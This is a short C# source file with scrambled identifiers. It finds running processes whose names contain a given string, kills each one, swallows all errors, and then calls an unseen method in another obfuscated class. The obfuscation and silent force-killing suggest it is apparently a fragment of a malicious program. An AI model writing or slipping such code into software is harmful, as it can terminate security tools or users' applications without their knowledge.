using System;
using System.Diagnostics;

namespace wDtIYaxdpawEu;

public sealed class nrboJBsNfPdvE
{
	public static bool hVDeUABwrMyXlZS(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void rULjCFgtZiVYst(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (hVDeUABwrMyXlZS(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					XudtxnGtRBJeB.GusvsHdJcE();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
